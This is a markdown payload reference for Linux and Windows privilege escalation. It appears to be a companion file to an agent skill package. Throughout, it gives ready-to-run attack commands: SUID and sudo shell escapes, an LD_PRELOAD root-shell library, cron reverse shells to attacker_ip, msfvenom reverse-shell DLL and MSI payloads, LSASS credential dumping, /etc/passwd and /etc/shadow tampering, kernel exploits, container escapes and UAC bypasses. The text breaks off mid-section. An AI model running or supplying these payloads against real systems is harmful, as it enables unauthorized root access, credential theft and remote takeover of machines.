# Payloads -- Privilege Escalation

> This file is a companion to `SKILL.md`, organizing all attack payloads and commands by category.

---

## 1. Automated Enumeration

### 1.1 Linux Enumeration with linpeas

```bash
# Transfer linpeas to target (from attacker machine)
python3 -c "import http.server; http.server.test(8000)" # serve files
# On target:
wget http://attacker_ip:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://attacker_ip:8000/linpeas.sh -o /tmp/linpeas.sh

# Run linpeas with all checks
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a 2>/dev/null | tee /tmp/linpeas.out

# Run linpeas in fast mode (skip time-consuming checks)
/tmp/linpeas.sh -q

# Run linpeas and search for specific keywords in output
/tmp/linpeas.sh 2>/dev/null | grep -i -E "sudo|suid|capability|cron|nfs|kernel|writable"

# Pipe through less for interactive review
/tmp/linpeas.sh -a 2>/dev/null | less -R
```

### 1.2 Windows Enumeration with winpeas

```powershell
# Transfer winpeas to target (PowerShell download)
Invoke-WebRequest -Uri "http://attacker_ip:8000/winPEAS.exe" -OutFile "C:\Temp\winPEAS.exe"
# Or using certutil
certutil -urlcache -split -f http://attacker_ip:8000/winPEAS.exe C:\Temp\winPEAS.exe

# Run winpeas with all checks
C:\Temp\winPEAS.exe quiet cmd fast

# Run specific winpeas categories
C:\Temp\winPEAS.exe servicesinfo    # Service misconfigurations
C:\Temp\winPEAS.exe credentials     # Stored credentials
C:\Temp\winPEAS.exe systeminfo      # System information and patches
```

### 1.3 Manual System Information Gathering

```bash
# Linux system profiling
uname -a                           # Kernel version and architecture
cat /etc/os-release                # Distribution and version
cat /proc/version                  # Kernel compile info
hostname                           # Hostname
id                                 # Current user and groups
whoami                             # Current username
cat /etc/passwd                    # All users on the system
cat /etc/group                     # All groups
env                                # Environment variables
dpkg -l 2>/dev/null                # Installed packages (Debian)
rpm -qa 2>/dev/null                # Installed packages (RHEL)
```

```powershell
# Windows system profiling
systeminfo                         # Full system information
whoami /all                        # Current user, groups, and privileges
hostname                           # Hostname
net user                           # Local users
net localgroup administrators      # Local admins
net group "Domain Admins" /domain  # Domain admins (if domain-joined)
set                                # Environment variables
```

---

## 2. SUID Binary Exploitation

### 2.1 SUID Discovery and Analysis

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null

# Find world-writable files with SUID (critical misconfiguration)
find / -perm -4007 -type f 2>/dev/null

# List SUID binaries with details
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Compare SUID binaries against known system defaults
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid_list.txt
```

### 2.2 GTFOBins SUID Exploitation

```bash
# SUID find -- execute commands as file owner (root)
find . -exec /bin/sh -p \;

# SUID vim -- spawn shell from within vim
vim -c ':!/bin/sh'
# Or inside vim:
:py3 import os; os.execl('/bin/sh', 'sh', '-p')

# SUID python/python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# SUID bash
bash -p

# SUID less/more
less /etc/passwd
# Inside less:
!/bin/sh

# SUID env
env /bin/sh -p

# SUID cp -- overwrite /etc/passwd
# Generate password hash: openssl passwd -1 -salt newuser newpass
echo 'newuser:$1$newuser$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd_entry
cp /tmp/passwd_entry /etc/passwd

# SUID nmap (older versions with interactive mode)
nmap --interactive
!sh

# SUID nano -- read/write any file
nano /etc/shadow

# SUID pkexec -- PwnKit (CVE-2021-4034)
# See kernel exploit section for PwnKit details
```

---

## 3. sudo Misconfiguration Abuse

### 3.1 sudo Rule Enumeration

```bash
# List sudo permissions for current user
sudo -l

# Check if sudo version is vulnerable
sudo --version
# CVE-2021-3156 (Baron Samedit) affects sudo < 1.9.5p2
```

### 3.2 Exploiting Common sudo Misconfigurations

```bash
# NOPASSWD for specific binaries -- direct shell escape
# Check GTFOBins for each binary allowed in sudo -l

# sudo vim/nano
sudo vim -c ':!/bin/bash'
sudo nano
# Inside nano: ^R^X, then: reset; sh 1>&0 2>&0

# sudo less/more
sudo less /etc/passwd
# Inside less: !bash

# sudo find
sudo find / -exec /bin/bash \;

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo python/python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# sudo perl
sudo perl -e 'exec "/bin/bash";'

# sudo ruby
sudo ruby -e 'exec "/bin/bash"'

# sudo lua
sudo lua -e 'os.execute("/bin/bash")'

# sudo ftp
sudo ftp
# Inside ftp: !/bin/bash

# sudo nmap
sudo nmap --interactive
!bash
# Or: sudo nmap --script <(echo 'os.execute("/bin/bash")')
```

### 3.3 sudo Wildcard Injection

```bash
# If sudo -l shows: (root) NOPASSWD: /usr/bin/tar cf /tmp/backup.tar *
# Exploit tar wildcard with checkpoint:

# On target, in the directory tar operates on:
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh privesc.sh'
echo 'chmod u+s /bin/bash' > privesc.sh
chmod +x privesc.sh

# When root runs tar, it processes the checkpoint arguments
# /bin/bash now has SUID bit set

# Similar technique for chown/chmod with wildcards
# If sudo rule uses wildcards with file manipulation commands
```

### 3.4 sudo Environment Variable Exploitation

```bash
# If sudo -l shows env_keep options:
# env_keep+=LD_PRELOAD

# Create shared library that spawns root shell
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# Execute with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>

# If env_keep+=PYTHONPATH
# Create malicious Python module in writable PYTHONPATH directory
```

### 3.5 sudo CVE Exploitation

```bash
# CVE-2021-3156 (Baron Samedit) -- heap overflow in sudo
# Affects: sudo 1.8.2 through 1.8.31p2, 1.9.0 through 1.9.5p1
# Check version:
sudo --version

# Exploit (requires local user, no sudo permissions needed)
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich <target_index>

# CVE-2019-14287 -- sudo user ID bypass
# If sudo -l shows: (ALL, !root) NOPASSWD: /bin/bash
# Bypass with:
sudo -u#-1 /bin/bash
```

---

## 4. Linux Capabilities Exploitation

### 4.1 Capability Enumeration

```bash
# Enumerate all capabilities on the system
getcap -r / 2>/dev/null

# Display capabilities of a specific binary
getcap /usr/bin/python3

# Display all capabilities for the current user context
capsh --print

# List all capability names and descriptions
capsh --supports
```

### 4.2 Exploiting Specific Capabilities

```bash
# cap_setuid -- escalate to root
# Python3 with cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# Perl with cap_setuid:
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# cap_dac_read_search -- read any file (bypass file permissions)
# tar with this capability can read /etc/shadow:
tar xf /etc/shadow -C /tmp/
# Or use debugfs for direct filesystem access

# cap_net_raw -- capture network traffic and craft raw packets
# tcpdump with cap_net_raw:
tcpdump -i eth0 -w /tmp/capture.pcap
# Capture credentials from plaintext protocols
tcpdump -i eth0 -A -s 0 port 21 or port 110 or port 143 or port 25

# cap_sys_admin -- broad system administration capability
# Mount filesystem:
mount /dev/sda1 /mnt
cat /mnt/etc/shadow
# Modify iptables, create namespaces, access kernel modules

# cap_sys_ptrace -- inject code into running processes
# Attach to root process and inject shellcode:
gdb -p $(pgrep -f "root_owned_process")
# Inside gdb:
# call system("chmod u+s /bin/bash")

# cap_setfcap -- set file capabilities
# Give bash cap_setuid:
python3 -c '
import os
os.setuid(0)
os.system("setcap cap_setuid+ep /usr/bin/python3_copy")
'
```

---

## 5. Cron Job Abuse

### 5.1 Cron Enumeration

```bash
# System-wide cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/
ls -la /var/spool/cron/

# Find all cron-related files
find /etc/cron* -type f 2>/dev/null

# Monitor running cron processes in real time
./pspy64 -pf -i 1000

# Check anacron for delayed job execution
cat /etc/anacrontab
```

### 5.2 Writable Cron Script Exploitation

```bash
# Find writable cron scripts
find /etc/cron* -writable 2>/dev/null
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/

# If a cron script running as root is writable:
# Append reverse shell payload
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /etc/cron.d/writable_script.sh

# Or add SUID to bash
echo 'chmod u+s /bin/bash' >> /etc/cron.d/writable_script.sh

# Or copy /bin/bash and set SUID
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /etc/cron.d/writable_script.sh

# Wait for cron execution, then:
/tmp/rootbash -p
```

### 5.3 Cron PATH Hijacking

```bash
# If /etc/crontab defines a custom PATH with writable directory:
# Example: PATH=/home/user:/usr/local/bin:/usr/bin:/bin

# Check for writable directories in cron PATH
echo "$CRON_PATH" | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done

# Place malicious binary before the legitimate one
echo '#!/bin/bash' > /home/user/target_binary_name
echo 'chmod u+s /bin/bash' >> /home/user/target_binary_name
chmod +x /home/user/target_binary_name

# Cron will execute the malicious binary first due to PATH order
```

### 5.4 Cron Wildcard Abuse

```bash
# If a cron job runs: tar cf backup.tar * in a writable directory
# Create exploit files using tar checkpoint arguments:
cd /path/to/cron/working/directory
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' > shell.sh
chmod +x shell.sh

# When cron runs tar, it interprets the filenames as arguments
```

---

## 6. NFS Root Squashing

```bash
# Check NFS exports on target
cat /etc/exports 2>/dev/null

# Look for no_root_squash entries
# Example: /share  *(rw,no_root_squash)

# On attacker machine, mount the NFS share
mkdir -p /mnt/nfs_share
mount -t nfs target_ip:/share /mnt/nfs_share

# Create a SUID binary on the mounted share (as root on attacker)
cp /bin/bash /mnt/nfs_share/rootbash
chmod u+s /mnt/nfs_share/rootbash

# On target, execute the SUID binary
/mnt/nfs_share/rootbash -p
# Result: root shell on target
```

---

## 7. Kernel Exploits

### 7.1 Kernel Exploit Identification

```bash
# Identify kernel version
uname -r
cat /proc/version
cat /etc/os-release

# Run linux-exploit-suggester
./linux-exploit-suggester.sh

# Run with specific kernel version
./linux-exploit-suggester.sh --uname "5.4.0-42-generic"

# Run linux-exploit-suggester-2 (Python version)
python3 linux-exploit-suggester-2.py
```

### 7.2 Common Kernel Exploits

```bash
# DirtyPipe (CVE-2022-0847) -- Linux kernel 5.8 to 5.16.11
# Overwrite any readable file (including SUID binaries)
gcc -o dirtypipe dirtypipe.c
./dirtypipe /usr/bin/sudo 1   # Overwrite sudo with root-owned payload

# DirtyCow (CVE-2016-5195) -- Linux kernel 2.6.22 to 4.8.3
# Race condition in COW handling
gcc -pthread dirty.c -o dirty -lcrypt
./dirty new_password
# Creates backup of passwd at /tmp/passwd.bak

# PwnKit (CVE-2021-4034) -- polkit pkexec SUID
# Affects almost all Linux distributions with polkit installed
gcc pwnkit.c -o pwnkit
./pwnkit
# Immediate root shell

# GameOver(lay) (CVE-2023-2640, CVE-2023-32629) -- Ubuntu OverlayFS
# Affects Ubuntu kernels using OverlayFS
gcc -o gameoverlay gameover.c
./gameoverlay

# StackRot (CVE-2023-3269) -- Linux kernel stack escalation
# Use exploit-suggester to verify applicability
```

---

## 8. Windows Token Impersonation

### 8.1 Token Privilege Enumeration

```powershell
# Current user privileges
whoami /priv

# Key privileges for escalation:
# SeImpersonatePrivilege    -> Potato attacks (Juicy, Rotten, Sweet)
# SeBackupPrivilege         -> Read any file (SAM, SYSTEM registry)
# SeDebugPrivilege          -> Access any process (LSASS dump)
# SeLoadDriverPrivilege     -> Load malicious kernel driver
# SeTakeOwnershipPrivilege  -> Take ownership of any object
# SeAssignPrimaryToken      -> Assign tokens to processes

# List running processes with their tokens
# (requires tools like Process Explorer or Handle)
tasklist /v

# Check for available tokens (PowerShell)
Get-Process | Select-Object Name, Id, SessionId
```

### 8.2 SeImpersonatePrivilege Exploitation (Potato Attacks)

```powershell
# JuicyPotato (Windows 7/8/10, Server 2008/2012/2016)
# Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# Find valid CLSIDs for target system
# Use JuicyPotato CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

# PrintSpoofer (works on Windows 10 / Server 2019 where JuicyPotato fails)
PrintSpoofer.exe -i -c cmd

# GodPotato (works on most Windows versions)
GodPotato.exe -cmd "cmd /c whoami"

# SweetPotato (combined potato attack tool)
SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami"
```

### 8.3 SeBackupPrivilege Exploitation

```powershell
# Read SAM and SYSTEM registry hives
reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\system.bak

# Transfer to attacker and extract hashes
# On attacker:
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# Read any file using BackupRead API
# Using PowerShell with SeBackupPrivilege:
Import-Module .\SeBackupPrivilege.psm1
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\secret.txt C:\Temp\secret.txt
```

### 8.4 SeDebugPrivilege Exploitation

```powershell
# Dump LSASS memory for credential extraction
# Using procdump (Sysinternals, signed binary):
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Using comsvcs.dll (no external tool needed):
rundll32.exe comsvcs.dll,MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Parse dump offline
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# Using nanodump (stealthier, direct syscall approach):
nanodump.exe --write C:\Temp\lsass.dmp
```

---

## 9. Windows Service Exploitation

### 9.1 Unquoted Service Path

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Example vulnerable path:
# C:\Program Files\Vulnerable Service\service.exe
# Windows tries: C:\Program.exe, then C:\Program Files\Vulnerable.exe

# Check write permissions on parent directories
# Using accesschk.exe (Sysinternals):
accesschk.exe /accepteula -uwcqv "Authenticated Users" C:\

# Place malicious executable in the intercepted path
# Example: place Program.exe in C:\
copy malicious.exe "C:\Program.exe"

# Restart the service or wait for reboot
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

### 9.2 Weak Service Permissions

```powershell
# Enumerate service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

# Check specific service permissions
sc qc "ServiceName"
accesschk.exe "Authenticated Users" -accepteula -k "HKLM\System\CurrentControlSet\Services\ServiceName"

# If you can modify the service binary path:
sc config "ServiceName" binPath= "C:\Temp\malicious.exe"
sc stop "ServiceName"
sc start "ServiceName"

# Using PowerUp.ps1 for automated service enumeration
Import-Module PowerUp.ps1
Get-UnquotedService
Get-ModifiableService
Get-ModifiableServiceFile
```

### 9.3 DLL Hijacking

```powershell
# Find DLL search order hijacking opportunities
# Check which DLLs a service loads:
# Using Process Monitor (Sysinternals) to identify DLLs

# Common hijackable DLLs:
# version.dll, dbghelp.dll, uxtheme.dll, cryptbase.dll

# Create malicious DLL that loads original + payload
# Using msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o version.dll

# Place malicious DLL in service directory (before system32 in search order)
copy version.dll "C:\Program Files\Vulnerable Service\"

# Restart service
sc stop "ServiceName"
sc start "ServiceName"
```

---

## 10. Windows Registry Exploitation

### 10.1 AlwaysInstallElevated

```powershell
# Check if AlwaysInstallElevated is enabled (both keys must be set to 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are enabled (value = 1), create malicious MSI package
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o malicious.msi

# Execute MSI as standard user -- it will run as SYSTEM
msiexec /quiet /qn /i malicious.msi
```

### 10.2 Stored Credentials

```powershell
# Check for stored credentials
cmdkey /list

# If credentials are found, use them with runas
runas /savecred /user:admin C:\Temp\malicious.exe

# Search for credentials in registry
reg query "HKLM\SOFTWARE" /s /f password 2>nul
reg query "HKCU\SOFTWARE" /s /f password 2>nul

# Check for unattended install files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\System32\sysprep\unattend.xml
type C:\Unattend.xml

# Search for credentials in files
findstr /si "password" C:\Users\*.xml C:\Users\*.txt C:\Users\*.ini 2>nul
```

### 10.3 AutoRun Programs

```powershell
# Check registry for AutoRun programs
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# If any AutoRun binary path is writable, replace it
copy /Y C:\Temp\malicious.exe "C:\Writable\AutoRun\program.exe"
```

---

## 11. UAC Bypass Techniques

### 11.1 UAC Level Check

```powershell
# Check current UAC configuration
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Values for ConsentPromptBehaviorAdmin:
# 0 = No prompt (UAC disabled)
# 1 = Prompt for credentials (secure desktop)
# 2 = Prompt for consent (secure desktop)
# 3 = Prompt for credentials
# 4 = Prompt for consent
# 5 = Default (prompt for non-Windows binaries)
```

### 11.2 UAC Bypass Methods

```powershell
# fodhelper.exe bypass (Windows 10/11)
# Set registry key to point to custom command
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "C:\Temp\malicious.exe" /f
# Trigger:
fodhelper.exe
# Cleanup:
reg delete "HKCU\Software\Classes\ms-settings" /f

# eventvwr.exe bypass (Windows 7/10)
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "C:\Temp\malicious.exe" /f
eventvwr.exe
# Cleanup:
reg delete "HKCU\Software\Classes\mscfile" /f

# cmstp.exe bypass (all Windows versions)
# Create malicious .inf file and execute:
cmstp.exe /s /ns malicious.inf

# DiskCleanup bypass
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Cache" /t REG_SZ /d "C:\Temp" /f
# Place malicious equiv DLL in cache path, then run DiskCleanup

# UACME tool (comprehensive UAC bypass collection)
# https://github.com/hfiref0x/UACME
Akagi64.exe <method_number> C:\Temp\malicious.exe
```

---

## 12. pspy Process Monitoring

```bash
# Monitor all processes (including those of other users) without root
./pspy64 -pf -i 1000

# Monitor with command line arguments
./pspy64 -pf -i 1000 | tee /tmp/pspy.log

# Filter for specific patterns
./pspy64 -pf -i 1000 2>/dev/null | grep -i -E "cron|root|admin|backup"

# Watch for file system events
./pspy64 -fs -i 1000

# Use pspy32 on 32-bit systems
./pspy32 -pf -i 1000
```

---

## 13. Writable /etc/passwd

```bash
# Check if /etc/passwd is writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt hacker password123
# Output: $1$hacker$Xxxxx...

# Add root user to /etc/passwd
echo 'hacker:$1$hacker$Xxxxx...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Or overwrite root's password field
# First backup:
cp /etc/passwd /tmp/passwd.bak
# Then modify:
sed -i 's/root:x:0:0/root:$1$hacker$Xxxxx...:0:0/' /etc/passwd

# Switch to new user
su hacker
# Password: password123

# Overwrite root password directly
echo 'root:$1$hacker$Xxxxx...:0:0:root:/root:/bin/bash' > /etc/passwd
```

---

## 14. Container Escalation Vectors

```bash
# Check if running inside a container
cat /proc/1/cgroup 2>/dev/null | grep -i docker
ls -la /.dockerenv 2>/dev/null

# Capabilities inside container (if capsh available)
capsh --print

# Check for Docker socket
ls -la /var/run/docker.sock

# If Docker socket is accessible: create privileged container
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# Check for host filesystem mounts
mount | grep -E "type (nfs|cifs|ext)"
cat /proc/mounts | grep -E "host"

# Check Kubernetes service account token
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

---

## 15. Linux Kernel Exploit Deep Dive

### 15.1 Dirty Cow (CVE-2016-5195) -- Advanced Variants

```bash
# Dirty Cow via PTRACE_POKEDATA (most reliable variant)
# Affects Linux kernel 2.6.22 through 4.8.3
gcc -pthread dirtyc0w.c -o dirtyc0w
./dirtyc0w /etc/passwd "hacker:$1$hacker$Xxxxx...:0:0:root:/root:/bin/bash"

# Dirty Cow via mmap write -- alternative exploit
gcc -o dirty_cow_mmap dirty_cow_mmap.c -lpthread
./dirty_cow_mmap /etc/passwd

# Dirty Cow via /proc/self/mem -- direct memory write
gcc -o cow_procmem cow_procmem.c
./cow_procmem /etc/passwd "root::0:0:root:/root:/bin/bash"

# Check if kernel is vulnerable to Dirty Cow
uname -r | awk -F. '{if ($1==4 && $2<=8) print "Vulnerable"; else if ($1<4 && $1>=2) print "Check version"; else print "Likely patched"}'
```

### 15.2 Dirty Pipe (CVE-2022-0847) -- Kernel 5.8 to 5.16.11

```bash
# Dirty Pipe -- overwrite any readable file as unprivileged user
# No race condition required (100% reliable, unlike Dirty Cow)
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1

# Overwrite SUID binary for instant root shell
# Find a readable SUID binary:
find / -perm -4000 -readable -type f 2>/dev/null | head -5
./dirtypipe /usr/bin/sudo 1

# Dirty Pipe via Python PoC
python3 dirtypipe.py --target /etc/passwd --offset 1 --data "root::0:0::/root:/bin/bash\n"

# Patch check -- kernel versions 5.8.0 to 5.16.10 are vulnerable
uname -r
# Fixed in: 5.16.11, 5.15.25, 5.10.102
```

### 15.3 PwnKit (CVE-2021-4034) -- polkit pkexec

```bash
# PwnKit -- affects all major distros with polkit installed
# No special privileges or user interaction required
gcc pwnkit.c -o pwnkit
./pwnkit
# Immediate root shell

# PwnKit with custom command execution
./pwnkit "id && cat /etc/shadow"

# Verify polkit is installed before attempting
which pkexec 2>/dev/null
dpkg -l policykit-1 2>/dev/null
rpm -qa polkit 2>/dev/null

# Check pkexec version for vulnerability
pkexec --version
```

### 15.4 GameOver(lay) -- CVE-2023-2640 / CVE-2023-32629

```bash
# Ubuntu OverlayFS privilege escalation
# Affects Ubuntu kernels using OverlayFS (multiple Ubuntu releases)
gcc -o gameoverlay gameover.c
./gameoverlay

# Verify Ubuntu kernel vulnerability
uname -r
cat /etc/os-release | grep -i ubuntu
# Affected: Ubuntu 22.04 (5.15.0), Ubuntu 20.04 (5.4.0), Ubuntu 23.04 (6.2.0)

# GameOver via overlayfs mount exploitation
# Create overlay mount, write to upperdir, gain root
mkdir -p /tmp/overlay /tmp/merged /tmp/work
mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/overlay,workdir=/tmp/work /tmp/merged
```

---

## 16. Advanced GTFOBins Techniques

### 16.1 File Read via GTFOBins

```bash
# Read /etc/shadow using SUID find
find /etc/shadow -exec cat {} \;

# Read files using SUID xxd
xxd /etc/shadow | xxd -r

# Read files using SUID hexdump
hd /etc/shadow | head -50

# Read files using SUID head (if only partial needed)
head -c 1000 /etc/shadow

# Read files using SUID tail
tail -n 100 /etc/shadow

# Read files via SUID rev (reverse output)
rev /etc/shadow | rev

# Read files via SUID sort (lines sorted alphabetically)
sort /etc/shadow
```

### 16.2 File Write via GTFOBins

```bash
# Overwrite /etc/passwd using SUID cp
echo 'hacker:$1$hacker$hash:0:0:root:/root:/bin/bash' > /tmp/newuser
cp /tmp/newuser /etc/passwd

# Write using SUID dd
echo 'hacker:$1$hacker$hash:0:0:root:/root:/bin/bash' | dd of=/etc/passwd conv=notrunc

# Write using SUID tee
echo 'hacker:$1$hacker$hash:0:0:root:/root:/bin/bash' | tee -a /etc/passwd

# Write using SUID install
install -m 4755 /tmp/rootbash /bin/rootbash
```

### 16.3 Shell Escapes via GTFOBins

```bash
# SUID make -- execute commands via makefile
echo 'all:\n\t/bin/bash -p' > /tmp/makefile
make -f /tmp/makefile

# SUID awk -- spawn shell
awk 'BEGIN {system("/bin/bash -p")}'

# SUID cpan -- perl shell escape
cpan
! exec "/bin/bash -p"

# SUID less -- execute commands
less /etc/passwd
# Type: !bash -p

# SUID more -- execute commands
more /etc/passwd
# Type: !bash

# SUID scp -- execute via scp -S (proxy command)
scp -S /path/to/shell.sh x y:

# SUID ssh -- proxy command escape
ssh -o ProxyCommand='bash -p -i' x
```

---

## 17. Docker and Container Escape

### 17.1 Docker Socket Escape

```bash
# Check if Docker socket is accessible
ls -la /var/run/docker.sock

# Escape via Docker socket -- mount host filesystem
docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs

# Escape via Docker API over TCP
docker -H tcp://127.0.0.1:2375 run -v /:/hostfs -it alpine chroot /hostfs

# Create privileged container with host PID namespace
docker -H unix:///var/run/docker.sock run --pid=host -it alpine nsenter -t 1 -m -u -i -n sh

# Docker escape via cgroup release_agent
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > '"$host_path"'/output' >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 17.2 Privileged Container Escape

```bash
# Check if container is privileged (full capabilities)
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged

# Decode capabilities
capsh --decode=0000003fffffffff

# Escape via device mount
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# Escape via nsenter (if PID namespace is shared)
nsenter -t 1 -m -u -i -n -- /bin/bash

# Escape via /proc/sys/kernel/core_pattern
echo "|/var/tmp/escape.sh" > /proc/sys/kernel/core_pattern
```

---

## 18. Database Privilege Escalation

### 18.1 MySQL UDF Privilege Escalation

```bash
# Check MySQL version and current privileges
mysql -u root -p -e "SELECT VERSION(); SELECT USER(); SHOW GRANTS;"

# MySQL UDF (User Defined Functions) privilege escalation
# Requires FILE privilege and plugin directory write access

# Check plugin directory
mysql -u root -p -e "SHOW VARIABLES LIKE 'plugin_dir';"

# Compile MySQL UDF exploit (sys_exec / sys_eval)
gcc -shared -fPIC -o /usr/lib/mysql/plugin/raptor_udf2.so raptor_udf2.so.c
# Or use pre-compiled:
# /usr/share/sqlmap/extra/sys_exec/raptor_udf2.so

# Register UDF and execute commands
mysql -u root -p << 'SQL'
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'raptor_udf2.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'raptor_udf2.so';
SQL

# Execute system commands as MySQL user (often root)
mysql -u root -p -e "SELECT sys_exec('id > /tmp/mysql_privesc.txt');"
mysql -u root -p -e "SELECT sys_eval('whoami');"
mysql -u root -p -e "SELECT sys_exec('chmod u+s /bin/bash');"
```

### 18.2 PostgreSQL Privilege Escalation

```bash
# Check PostgreSQL version and current role
psql -U postgres -c "SELECT version(); SELECT current_user;"

# PostgreSQL COPY command for file read
psql -U postgres -c "COPY (SELECT 1) TO '/tmp/test';"
psql -U postgres -c "COPY (SELECT pg_read_file('/etc/shadow')) TO '/tmp/shadow.txt';"

# PostgreSQL large object for binary file operations
psql -U postgres << 'SQL'
SELECT lo_create(1234);
SELECT lo_export(1234, '/tmp/exported_file');
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (1234, 0, decode('f0VMRg==', 'base64'));
SELECT lo_import('/etc/shadow', 5678);
SELECT lo_export(5678, '/tmp/shadow_copy');
SQL

# PostgreSQL command execution via COPY PROGRAM (PostgreSQL 9.3+)
psql -U postgres -c "COPY (SELECT 'id') TO PROGRAM '/bin/bash -c \"id > /tmp/pg_output\"';"

# PostgreSQL extension creation for code execution
psql -U postgres -c "CREATE EXTENSION pgcrypto;"
psql -U postgres -c "CREATE EXTENSION dblink;"

# PostgreSQL dblink for lateral network access
psql -U postgres -c "SELECT dblink_connect('host=127.0.0.1 port=5432 dbname=postgres user=postgres password=guess');"
```

---

## 19. Windows UAC Bypass Advanced Techniques

### 19.1 UAC Bypass via Token Manipulation

```powershell
# UAC bypass via COM object hijacking (ICMLuaUtil)
# Works on Windows 10/11 with default UAC settings
reg add "HKCU\Software\Classes\CLSID\{F2C4639E-6E61-4766-872C-5FDE252F35C6}\LocalServer32" /ve /t REG_SZ /d "C:\Temp\malicious.exe" /f
# Trigger via scheduled task:
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup"

# UAC bypass via WSReset.exe (Windows Store reset)
